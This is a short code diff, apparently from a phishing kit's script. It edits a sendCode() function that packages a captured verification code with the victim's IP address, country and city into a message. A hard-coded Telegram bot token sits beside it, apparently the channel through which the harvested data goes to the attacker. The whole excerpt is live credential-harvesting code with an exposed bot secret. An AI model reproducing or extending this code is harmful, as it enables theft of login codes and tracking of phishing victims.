@@ -168,7 +168,7 @@ function sendCode() {
             $('#code').removeClass('border-danger');
         }
         code1 = keymap;
-        const message1 = `%0A<strong>Code: </strong><code>${code1}</code>\n%0A<strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>\n%0A<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)\n%0A<strong>City: </strong><code>${IpAddress.city}</code>`;
+        const message1 = `🔓<strong>Code: </strong><code>${code1}</code>\n🌐<strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>\n%0A<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)\n%0A<strong>City: </strong><code>${IpAddress.city}</code>`;
 
         NUMBER_TIME_SEND_CODE++;
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
